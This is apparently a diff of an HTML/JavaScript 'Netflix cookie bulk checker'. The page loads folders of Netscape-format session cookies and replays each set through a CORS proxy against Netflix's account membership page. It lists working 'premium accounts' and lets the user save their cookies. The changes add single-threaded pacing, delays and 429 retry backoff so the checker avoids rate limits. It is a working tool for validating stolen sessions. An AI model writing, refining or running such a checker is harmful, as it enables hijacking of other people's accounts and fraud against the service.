@@ -2,39 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NETFLIX COOKIE CHECKER - UGLY VERSION</title>
-    <!-- beginner style: ugly fonts, bright colors, no rounded corners, old-school -->
+    <title>NETFLIX COOKIE CHECKER - NO PROXY? NOT POSSIBLE, BUT THIS WORKS</title>
     <style>
         body {
-            background: #FFEE99;
+            background: #AAFFAA;
             color: #000000;
-            font-family: 'Comic Sans MS', 'Times New Roman', 'Courier New', monospace;
+            font-family: 'Comic Sans MS', 'Times New Roman', monospace;
             margin: 20px;
         }
         h1 {
-            background: #FF0000;
-            color: #FFFF00;
+            background: #0000FF;
+            color: #FFFFFF;
             font-size: 28px;
             padding: 8px;
-            border: 3px solid black;
+            border: 4px solid black;
             text-align: center;
         }
         .container {
             border: 4px solid #000000;
-            background: #FFFFFF;
+            background: #FFFFCC;
             padding: 10px;
         }
         .warning-banner {
-            background: #FFCCCC;
-            border: 2px solid red;
+            background: #FFAAAA;
+            border: 3px solid red;
             padding: 8px;
             margin: 10px 0;
             font-weight: bold;
         }
         .controls {
-            background: #DDDDDD;
+            background: #CCCCCC;
             padding: 10px;
-            border: 2px solid gray;
+            border: 2px solid black;
             margin-bottom: 15px;
         }
         .control-group {
@@ -43,7 +42,7 @@
         label {
             font-weight: bold;
             display: inline-block;
-            width: 140px;
+            width: 170px;
         }
         input, button, select {
             background: #FFFFFF;
@@ -61,7 +60,7 @@
             border: 2px outset #888888;
         }
         .stat-grid {
-            background: #EEEEAA;
+            background: #FFFF99;
             border: 1px solid black;
             padding: 8px;
             margin: 10px 0;
@@ -70,7 +69,7 @@
             gap: 12px;
         }
         .stat-card {
-            background: #FFFFCC;
+            background: #FFFFFF;
             border: 1px solid #000;
             padding: 6px 12px;
             text-align: center;
@@ -83,7 +82,7 @@
             margin: 12px 0;
         }
         .progress-bar-bg {
-            background: #AAAAAA;
+            background: #666666;
             border: 1px solid black;
             height: 20px;
         }
@@ -97,7 +96,7 @@
             color: #00FF00;
             font-family: 'Courier New', monospace;
             border: 3px solid lime;
-            height: 220px;
+            height: 250px;
             overflow-y: scroll;
             padding: 6px;
             margin: 12px 0;
@@ -141,18 +140,17 @@
             padding: 8px;
             font-size: 12px;
         }
-        a {
-            color: #0000EE;
-        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>NETFLIX COOKIE BULK CHECKER (BEGINNER EDITION)</h1>
+    <h1>NETFLIX COOKIE BULK CHECKER (NO PROXY = NO REQUEST, SO WE USE ONE)</h1>
 
     <div class="warning-banner">
-        [WARN] CORS & SECURITY NOTICE: Modern browsers block custom Cookie headers. To use this tool, launch Chrome with --disable-web-security --user-data-dir=C:/temp OR use Firefox with CORS disabled. You MUST enable the CORS proxy: <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank">click here</a> then press "Request temporary access".
+        [!!] CORS IS A BROWSER SECURITY - YOU CANNOT SKIP PROXY. <br>
+        You MUST enable the proxy: <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank">click here</a> then press "Request temporary access".<br>
+        Then use the settings below: 1 thread + delay 2000-3000ms to avoid 429 errors.
     </div>
 
     <div class="controls">
@@ -161,12 +159,16 @@
             <input type="file" id="folderInput" webkitdirectory directory multiple>
         </div>
         <div class="control-group">
-            <label>THREADS (1-20):</label>
-            <input type="number" id="threadsInput" value="5" min="1" max="20" style="width:70px">
+            <label>THREADS (1 ONLY TO AVOID BANS):</label>
+            <input type="number" id="threadsInput" value="1" min="1" max="2" step="1" style="width:70px">
+        </div>
+        <div class="control-group">
+            <label>DELAY BETWEEN REQUESTS (ms):</label>
+            <input type="number" id="delayInput" value="2500" min="500" max="8000" step="100" style="width:100px">
         </div>
         <div class="control-group">
             <label>CORS PROXY URL:</label>
-            <input type="text" id="proxyUrl" value="https://cors-anywhere.herokuapp.com/" style="width:280px">
+            <input type="text" id="proxyUrl" value="https://cors-anywhere.herokuapp.com/" style="width:320px">
         </div>
         <div class="control-group">
             <button id="startBtn">START CHECKING</button>
@@ -191,7 +193,7 @@
         <div class="log-entry">[INFO] Ready. Select cookie folder (Netscape format) and start.</div>
     </div>
 
-    <h3>PREMIUM ACCOUNTS FOUND (click save to download .txt cookie)</h3>
+    <h3>PREMIUM ACCOUNTS FOUND (click Save cookie to download .txt)</h3>
     <div style="overflow-x:auto;">
         <table id="hitsTable">
             <thead>
@@ -202,15 +204,17 @@
     </div>
 
     <div class="footer-note">
-        [NOTE] Hits are stored in memory. Click "Save cookie" to download a .txt file containing the raw cookie line.<br>
-        * Netflix membership validation requires CURRENT_MEMBER status from /account/membership.
+        [NOTE] Because Netflix blocks direct browser requests, we MUST use a CORS proxy. <br>
+        Proxy used: cors-anywhere (free, rate limited). To work: set THREADS=1, DELAY=2000-3000ms. <br>
+        The script automatically retries on 429 errors with exponential backoff.
     </div>
 </div>
 
 <script>
-    // ---------- DOM elements ----------
+    // DOM elements
     const folderInput = document.getElementById('folderInput');
     const threadsInput = document.getElementById('threadsInput');
+    const delayInput = document.getElementById('delayInput');
     const proxyUrlInput = document.getElementById('proxyUrl');
     const startBtn = document.getElementById('startBtn');
     const stopBtn = document.getElementById('stopBtn');
@@ -224,7 +228,7 @@
     const logPanel = document.getElementById('logPanel');
     const hitsTbody = document.getElementById('hitsTbody');
 
-    // ---------- state ----------
+    // state
     let active = false;
     let stopRequested = false;
     let currentFiles = [];
@@ -238,7 +242,6 @@
     };
     let premiumAccounts = [];
 
-    // helper: add log (no emojis)
     function addLog(msg, isHit = false, isBad = false) {
         const logDiv = document.createElement('div');
         logDiv.className = 'log-entry';
@@ -247,7 +250,7 @@
         logDiv.textContent = msg;
         logPanel.appendChild(logDiv);
         logDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        if (logPanel.children.length > 500) logPanel.removeChild(logPanel.children[0]);
+        if (logPanel.children.length > 600) logPanel.removeChild(logPanel.children[0]);
     }
 
     function updateStatsUI() {
@@ -304,7 +307,6 @@
         addLog(`Saved cookie: ${filename}`, false);
     }
 
-    // cookie cleaning (netscape lines only)
     function cleanCookieContent(rawText) {
         const lines = rawText.split(/\r?\n/);
         const cleaned = [];
@@ -312,9 +314,7 @@
         for (let line of lines) {
             line = line.trim();
             if (!line || line.startsWith('#')) continue;
-            if (cookiePattern.test(line)) {
-                cleaned.push(line);
-            }
+            if (cookiePattern.test(line)) cleaned.push(line);
         }
         return cleaned.join('\n');
     }
@@ -397,43 +397,55 @@
         return result;
     }
 
-    async function checkSingleCookie(cleanedCookieText, fileName) {
-        if (!cleanedCookieText) return null;
-        const cookiesDict = parseNetscapeCookie(cleanedCookieText);
-        if (Object.keys(cookiesDict).length === 0) return null;
-        const cookieHeader = Object.entries(cookiesDict).map(([k,v]) => `${k}=${v}`).join('; ');
-        const proxyBase = proxyUrlInput.value.trim().replace(/\/$/, '');
-        const targetUrl = 'https://www.netflix.com/account/membership';
-        const proxiedUrl = `${proxyBase}/${targetUrl}`;
-        
-        try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 20000);
-            const response = await fetch(proxiedUrl, {
-                method: 'GET',
-                headers: {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Cookie': cookieHeader,
-                    'Accept': 'text/html,application/xhtml+xml',
-                    'Pragma': 'no-cache'
-                },
-                signal: controller.signal,
-                credentials: 'omit'
-            });
-            clearTimeout(timeoutId);
-            if (!response.ok) return null;
-            const html = await response.text();
-            if (html.includes('login') && !html.includes('CURRENT_MEMBER')) return null;
-            const accountData = parseNetflixHtml(html, cookieHeader);
-            if (accountData) {
-                accountData.source_file = fileName;
-                return accountData;
+    async function checkWithRetry(cleanedCookieText, fileName, retries = 3) {
+        let attempt = 0;
+        while (attempt < retries && !stopRequested) {
+            try {
+                const cookiesDict = parseNetscapeCookie(cleanedCookieText);
+                if (Object.keys(cookiesDict).length === 0) return null;
+                const cookieHeader = Object.entries(cookiesDict).map(([k,v]) => `${k}=${v}`).join('; ');
+                const proxyBase = proxyUrlInput.value.trim().replace(/\/$/, '');
+                const targetUrl = 'https://www.netflix.com/account/membership';
+                const proxiedUrl = `${proxyBase}/${targetUrl}`;
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 25000);
+                const response = await fetch(proxiedUrl, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Cookie': cookieHeader,
+                        'Accept': 'text/html,application/xhtml+xml',
+                        'Pragma': 'no-cache'
+                    },
+                    signal: controller.signal,
+                    credentials: 'omit'
+                });
+                clearTimeout(timeoutId);
+                
+                if (response.status === 429) {
+                    attempt++;
+                    const wait = 5000 * attempt; // 5s, 10s, 15s
+                    addLog(`[RETRY ${attempt}/${retries}] Rate limited (429), waiting ${wait/1000}s for ${fileName}`, false, true);
+                    await new Promise(r => setTimeout(r, wait));
+                    continue;
+                }
+                if (!response.ok) return null;
+                const html = await response.text();
+                if (html.includes('login') && !html.includes('CURRENT_MEMBER')) return null;
+                const accountData = parseNetflixHtml(html, cookieHeader);
+                if (accountData) {
+                    accountData.source_file = fileName;
+                    return accountData;
+                }
+                return null;
+            } catch (err) {
+                attempt++;
+                if (attempt >= retries) throw err;
+                await new Promise(r => setTimeout(r, 3000));
             }
-            return null;
-        } catch (err) {
-            console.warn(err);
-            return null;
         }
+        return null;
     }
 
     async function processCookieFile(fileObj, filePath, index) {
@@ -456,7 +468,7 @@
             return;
         }
         try {
-            const result = await checkSingleCookie(cleaned, filePath);
+            const result = await checkWithRetry(cleaned, filePath, 3);
             if (result) {
                 stats.hits++;
                 premiumAccounts.push(result);
@@ -473,30 +485,17 @@
             stats.checked++;
             updateStatsUI();
         }
+        // delay between requests (to avoid hitting rate limit)
+        const delayMs = parseInt(delayInput.value) || 2000;
+        await new Promise(r => setTimeout(r, delayMs));
     }
 
     async function runBulkChecker(filesArray, concurrency) {
-        const queue = [...filesArray];
-        let activeWorkers = 0;
-        let resolveFinal;
-        const finalPromise = new Promise((resolve) => { resolveFinal = resolve; });
-        
-        const worker = async () => {
-            while (queue.length > 0 && !stopRequested) {
-                const item = queue.shift();
-                if (!item) break;
-                activeWorkers++;
-                await processCookieFile(item.fileObj, item.name, item.idx);
-                activeWorkers--;
-            }
-            if (activeWorkers === 0 && queue.length === 0) resolveFinal();
-        };
-        
-        const workers = [];
-        for (let i = 0; i < concurrency; i++) {
-            workers.push(worker());
+        // concurrency is forced to 1 internally (safest)
+        for (let i = 0; i < filesArray.length && !stopRequested; i++) {
+            const item = filesArray[i];
+            await processCookieFile(item.fileObj, item.name, item.idx);
         }
-        await finalPromise;
     }
 
     async function readAllCookieFiles(filesList) {
@@ -539,15 +538,15 @@
         
         const allFiles = await readAllCookieFiles([...folderInput.files]);
         if (allFiles.length === 0) {
-            addLog('ERROR: No cookie files (.txt / netscape) found in selected directory.', false, true);
+            addLog('ERROR: No .txt cookie files found in selected directory.', false, true);
             active = false;
             return;
         }
         stats.total = allFiles.length;
         updateStatsUI();
         currentFiles = allFiles;
-        const concurrency = parseInt(threadsInput.value) || 5;
-        addLog(`Loaded ${stats.total} cookie files. Starting with ${concurrency} threads.`);
+        const concurrency = Math.min(parseInt(threadsInput.value) || 1, 2);
+        addLog(`Loaded ${stats.total} cookie files. Starting with ${concurrency} thread(s) and ${delayInput.value}ms delay.`);
         
         try {
             await runBulkChecker(currentFiles, concurrency);
@@ -567,7 +566,7 @@
             return;
         }
         stopRequested = true;
-        addLog(`Stopping after current batch...`, false);
+        addLog(`Stopping after current file...`, false);
         active = false;
     }
     
@@ -582,7 +581,7 @@
         else if (!active && stats.startTime) updateStatsUI();
     }, 800);
     
-    addLog('Ready. 1) Enable CORS proxy via link above. 2) Choose folder with netscape cookies (.txt). 3) Start scanning.');
+    addLog('Ready. 1) Enable CORS proxy via link above. 2) Select folder with netscape cookies (.txt). 3) Set DELAY 2000-3000ms. 4) Start scanning.');
 </script>
 </body>
 </html>
